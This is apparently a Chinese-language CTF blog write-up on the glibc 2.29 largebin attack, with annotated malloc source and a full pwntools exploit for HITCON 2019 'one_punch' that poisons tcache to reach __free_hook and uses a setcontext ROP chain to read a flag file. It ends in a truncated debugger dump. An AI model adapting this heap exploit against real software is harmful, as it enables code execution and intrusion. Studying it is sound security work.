<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    largebin_attack-glibc2.29 |
    
    The lair of C0yo7e</title>
  
    <link rel="shortcut icon" href="/images/time.png">
  
  <link rel="stylesheet" href="/css/style.css">
  
    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
  
  <script src="/js/pace.min.js"></script>
</head>
</html>
<body>
<main class="content">
  <section class="outer">
  

<article id="post-largebin-attack-glibc2-29" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      largebin_attack-glibc2.29
    </h1>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/08/06/largebin-attack-glibc2-29/" class="article-date">
  <time datetime="2020-08-06T12:20:24.000Z" itemprop="datePublished">2020-08-06</time>
</a>
        
      </div>
    

    
      
    <div class="tocbot"></div>





    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>和glibc2.23版本相比，2.29的版本对unsorted bin的检查多了很多，导致unsorted bin attack几乎不可行，所以我们用largebin attack作为它的替代</p>
<a id="more"></a>

<h2 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">       <span class="keyword">else</span> <span class="comment">//largebin</span></span><br><span class="line">       &#123;</span><br><span class="line">         victim_index = largebin_index (size);</span><br><span class="line">         bck = bin_at (av, victim_index);</span><br><span class="line">         fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">         <span class="keyword">if</span> (fwd != bck) <span class="comment">//list里面有bin</span></span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">             size |= PREV_INUSE;</span><br><span class="line">             <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">             assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">             <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">   &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))  <span class="comment">//小于已有所有堆块的大小</span></span><br><span class="line">               &#123;</span><br><span class="line">                 fwd = bck;</span><br><span class="line">                 bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                 victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;  <span class="comment">//解链，利用点1</span></span><br><span class="line">                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span> <span class="comment">//大于等于列表中已有的个别堆块</span></span><br><span class="line">               &#123;</span><br><span class="line">                 assert (chunk_main_arena (fwd));</span><br><span class="line">                 <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd)) <span class="comment">//找到第一个比他小的堆块</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))  <span class="comment">//两个相等，不进入</span></span><br><span class="line">                   <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                   fwd = fwd-&gt;fd; </span><br><span class="line">                 <span class="keyword">else</span>  <span class="comment">//不等就插入</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; </span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//利用点2</span></span><br><span class="line">                   &#125;</span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span> <span class="comment">//largebin队列为空</span></span><br><span class="line">           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>关于绕过unlink</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">for (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          /* Skip rest of block if there are no more set bits in this block.  */</span><br><span class="line">          if (bit &gt; map || bit == 0)</span><br><span class="line">            &#123;</span><br><span class="line">              do</span><br><span class="line">                &#123;</span><br><span class="line">                  if (++block &gt;= BINMAPSIZE) /* out of bins */</span><br><span class="line">                    goto use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              while ((map = av-&gt;binmap[block]) == 0);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = 1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* Advance to bin with set bit. There must be one. */</span><br><span class="line">          while ((bit &amp; map) == 0)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= 1;</span><br><span class="line">              assert (bit != 0);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* Inspect the bin. It is likely to be non-empty */</span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          /*  If a false alarm (empty bin), clear the bit. */</span><br><span class="line">          if (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= 1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          else</span><br><span class="line">            &#123; //想绕过unlink就不进入这个</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              /*  We know the first chunk in this bin is big enough to use. */</span><br><span class="line">              assert ((unsigned long) (size) &gt;= (unsigned long) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              /* unlink */</span><br><span class="line">              unlink_chunk (av, victim);</span><br></pre></td></tr></table></figure>

<h3 id="构造的条件："><a href="#构造的条件：" class="headerlink" title="构造的条件："></a>构造的条件：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">largebin和unsortedbin中各有一个chunk;</span><br><span class="line">largebin的fd_nextsize为<span class="number">0</span>;</span><br><span class="line">largebin中的chunk-&gt;bk_nextsize可控制;</span><br><span class="line">unsortedbin里的chunk大于largebin，并且如果进入largebin，是同一个index。(<span class="number">0x40</span>)</span><br></pre></td></tr></table></figure>

<h3 id="例题：HITCONCTF-2019-one-punch"><a href="#例题：HITCONCTF-2019-one-punch" class="headerlink" title="例题：HITCONCTF 2019 one_punch"></a>例题：HITCONCTF 2019 one_punch</h3><p>有后门函数，里面是malloc添加大小为0x217的堆块，而debuf函数是calloc，所以我们可以想到利用tcache，达到任意地址写的目的</p>
<p>在堆块里的第一个chunk是用来存tcache的地址的，calloc是优先在unsortedbin里取堆块的，而后门里用的malloc，可以取tcache里的堆块<br>构造fake chunk 的fd_nextsize 和 bk_nextsize  使它free完之后可以将目的地址写入unsortedbin然后通过calloc将free_hook地址写入tcache相应位置，通过后门将我们的地址写入free_hook即可</p>
<h4 id="方法一’s-exp"><a href="#方法一’s-exp" class="headerlink" title="方法一’s exp"></a>方法一’s exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> PIE:</span><br><span class="line">		text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">		gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">	p.sendline(str(c))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"name: "</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"name: "</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(host,port=<span class="number">26976</span>)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> p</span><br><span class="line">	<span class="keyword">if</span> host:</span><br><span class="line">		p = remote(host,port)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = process(<span class="string">"./one_punch"</span>)</span><br><span class="line">		<span class="comment"># debug(0x0000000000015BB)</span></span><br><span class="line">		<span class="comment"># gdb.attach(p,"b *setcontext+53")</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	add(<span class="number">2</span>, <span class="string">'a'</span> * <span class="number">0x217</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		add(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">0x217</span>)</span><br><span class="line">		dele(<span class="number">0</span>)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	p.recvuntil(<span class="string">": "</span>)</span><br><span class="line">	heap = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b"\x00"</span>)) - <span class="number">0x480</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">		add(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">0x217</span>)</span><br><span class="line">		dele(<span class="number">0</span>)</span><br><span class="line">	<span class="comment"># gdb.attach(p)</span></span><br><span class="line">	dele(<span class="number">2</span>)</span><br><span class="line">	show(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">": "</span>)</span><br><span class="line">	libc_base = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b"\x00"</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line">	</span><br><span class="line">	info(<span class="string">"heap : "</span> + hex(heap))</span><br><span class="line">	info(<span class="string">"libc : "</span> + hex(libc_base))</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#overlapping</span></span><br><span class="line">	</span><br><span class="line">	length = <span class="number">0xe0</span></span><br><span class="line">	add(<span class="number">0</span>, <span class="string">'a'</span> * length) <span class="comment">#add-&gt;chunk2's site</span></span><br><span class="line">	add(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">0x80</span>)  <span class="comment">#add-&gt;chunk2-&gt;next</span></span><br><span class="line">	edit(<span class="number">2</span>, <span class="string">b'\x00'</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) <span class="comment">#-&gt;chunk1</span></span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	edit(<span class="number">2</span>, <span class="string">b'\x00'</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	edit(<span class="number">2</span>, <span class="string">b'\x00'</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x3a1</span>))</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	<span class="comment">#三个chunk使得0xxxxxxxx148位置的被改写成0x301</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">		add(<span class="number">1</span>, <span class="string">'b'</span> * <span class="number">0x3a8</span>)</span><br><span class="line">		dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">2</span>, <span class="string">b'\x00'</span> * length + p64(<span class="number">0x300</span>) + p64(<span class="number">0x570</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)+ p64(heap + <span class="number">0x40</span>) + p64(heap + <span class="number">0x40</span>)) </span><br><span class="line">	dele(<span class="number">0</span>) <span class="comment">#--&gt;0x140 into unsorted bin  (storged the tcache 0x220 size chunk_addr)</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0</span>, <span class="string">b'c'</span> * <span class="number">0x100</span> + p64(libc.symbols[<span class="string">'__free_hook'</span>]+libc_base)) <span class="comment">#0x10-0x400 save the tcache_addr ##  free chunk -&gt;into 0x150</span></span><br><span class="line">	<span class="comment"># gdb.attach(p)</span></span><br><span class="line">	cmd(str(<span class="number">50056</span>)) <span class="comment">#malloc 0x217 -&gt;tcache</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; </span></span><br><span class="line">	p.send(p64(libc_base+<span class="number">0x000000000012be97</span>))  <span class="comment">#malloc  write tcache bin --&gt;free_hook</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># 0x7f903816ae35 &lt;setcontext+53&gt;:	mov    rsp,QWORD PTR [rdx+0xa0]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae3c &lt;setcontext+60&gt;:	mov    rbx,QWORD PTR [rdx+0x80]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae43 &lt;setcontext+67&gt;:	mov    rbp,QWORD PTR [rdx+0x78]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae47 &lt;setcontext+71&gt;:	mov    r12,QWORD PTR [rdx+0x48]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae4b &lt;setcontext+75&gt;:	mov    r13,QWORD PTR [rdx+0x50]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae4f &lt;setcontext+79&gt;:	mov    r14,QWORD PTR [rdx+0x58]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae53 &lt;setcontext+83&gt;:	mov    r15,QWORD PTR [rdx+0x60]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae57 &lt;setcontext+87&gt;:	mov    rcx,QWORD PTR [rdx+0xa8]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae5e &lt;setcontext+94&gt;:	push   rcx</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae5f &lt;setcontext+95&gt;:	mov    rsi,QWORD PTR [rdx+0x70]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae63 &lt;setcontext+99&gt;:	mov    rdi,QWORD PTR [rdx+0x68]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae67 &lt;setcontext+103&gt;:	mov    rcx,QWORD PTR [rdx+0x98]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae6e &lt;setcontext+110&gt;:	mov    r8,QWORD PTR [rdx+0x28]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae72 &lt;setcontext+114&gt;:	mov    r9,QWORD PTR [rdx+0x30]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae76 &lt;setcontext+118&gt;:	mov    rdx,QWORD PTR [rdx+0x88]</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae7d &lt;setcontext+125&gt;:	xor    eax,eax</span></span><br><span class="line">	<span class="comment"># 0x7f903816ae7f &lt;setcontext+127&gt;:	ret    </span></span><br><span class="line">	<span class="comment"># 00000000000026542: pop rdi; ret;</span></span><br><span class="line">	<span class="comment"># 0x000000000012bdc9: pop rdx; pop rsi; ret;</span></span><br><span class="line">	<span class="comment"># 0x0000000000047cf8: pop rax; ret;</span></span><br><span class="line">	<span class="comment"># 0x00000000000cf6c5: syscall; ret;x</span></span><br><span class="line">	p_rdi = <span class="number">0x0000000000026542</span>+libc_base</span><br><span class="line">	p_rdx_rsi = <span class="number">0x000000000012bdc9</span>+libc_base</span><br><span class="line">	p_rax = <span class="number">0x0000000000047cf8</span>+libc_base</span><br><span class="line">	syscall_ret = <span class="number">0x00000000000cf6c5</span>+libc_base</span><br><span class="line">	payload = p64(libc.symbols[<span class="string">"setcontext"</span>]+libc_base+<span class="number">53</span>)+p64(heap+<span class="number">0x1ac0</span>)</span><br><span class="line">	payload += <span class="string">b'./flag.txt'</span>+<span class="string">b'\x00'</span>*<span class="number">6</span></span><br><span class="line">	payload += p64(<span class="number">0</span>)*<span class="number">9</span>	<span class="comment">#offset 0x68</span></span><br><span class="line">	payload += p64(heap+<span class="number">0x1ad0</span>)	<span class="comment">#rdi</span></span><br><span class="line">	payload += p64(<span class="number">0</span>)		<span class="comment">#rsi</span></span><br><span class="line">	payload += p64(heap+<span class="number">0x2000</span>)	<span class="comment">#rbp</span></span><br><span class="line">	payload += p64(<span class="number">0</span>)*<span class="number">2</span>		<span class="comment">#rbx and rdx</span></span><br><span class="line">	payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">	payload += p64(heap+<span class="number">0x1b78</span>)	<span class="comment"># rsp</span></span><br><span class="line">	payload += p64(p_rax)		<span class="comment">#rcx</span></span><br><span class="line">	payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">	payload += p64(<span class="number">2</span>)</span><br><span class="line">	payload += p64(syscall_ret)</span><br><span class="line">	payload += p64(p_rdi)+p64(<span class="number">3</span>)+p64(p_rdx_rsi)+p64(<span class="number">0x80</span>)+p64(heap+<span class="number">0x2d00</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">	payload += p64(p_rdi)+p64(<span class="number">1</span>)+p64(p_rax)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line">	payload += p64(p_rdi)+p64(<span class="number">0</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">	edit(<span class="number">1</span>,payload)</span><br><span class="line">	dele(<span class="number">1</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">	main(args[<span class="string">'REMOTE'</span>])</span><br></pre></td></tr></table></figure>

<h5 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h5><p>1.为什么构造largebin的时候是在fd_nextsize &amp; bk_nextsize填入目的地址，而fd还有bk都是0？</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0x55bad5321350</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RBX  <span class="number">0x55bad5321040</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x301</span></span><br><span class="line"> RDX  <span class="number">0x55bad5321350</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RDI  <span class="number">0x55bad5321040</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSI  <span class="number">0x0</span></span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x0</span></span><br><span class="line"> R10  <span class="number">0x7f6e0102cae0</span> (_nl_C_LC_CTYPE_toupper+<span class="number">512</span>) ◂— <span class="number">0x100000000</span></span><br><span class="line"> R11  <span class="number">0x7f6e0102d3e0</span> (_nl_C_LC_CTYPE_class+<span class="number">256</span>) ◂— <span class="number">0x2000200020002</span></span><br><span class="line"> R12  <span class="number">0x7f6e01077c40</span> (main_arena) ◂— <span class="number">0x0</span></span><br><span class="line"> R13  <span class="number">0x55bad53218b0</span> ◂— <span class="number">0x616161616161</span> /* <span class="string">'aaaaaa'</span> */</span><br><span class="line"> R14  <span class="number">0x1</span></span><br><span class="line"> R15  <span class="number">0x220</span></span><br><span class="line"> RBP  <span class="number">0x870</span></span><br><span class="line"> RSP  <span class="number">0x7ffe7a82d4f0</span> ◂— <span class="number">0x50000</span></span><br><span class="line"> RIP  <span class="number">0x7f6e00f26781</span> (unlink_chunk.isra+<span class="number">33</span>) ◂— cmp    rdi, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   <span class="number">0x7f6e00f2676b</span> &lt;unlink_chunk.isra+<span class="number">11</span>&gt;     <span class="keyword">and</span>    rax, <span class="number">0xfffffffffffffff8</span></span><br><span class="line">   <span class="number">0x7f6e00f2676f</span> &lt;unlink_chunk.isra+<span class="number">15</span>&gt;     cmp    rax, qword ptr [rdi + rax]</span><br><span class="line">   <span class="number">0x7f6e00f26773</span> &lt;unlink_chunk.isra+<span class="number">19</span>&gt;     jne    unlink_chunk.isra+<span class="number">213</span> &lt;<span class="number">0x7f6e00f26835</span>&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   <span class="number">0x7f6e00f26779</span> &lt;unlink_chunk.isra+<span class="number">25</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0x10</span>]</span><br><span class="line">   <span 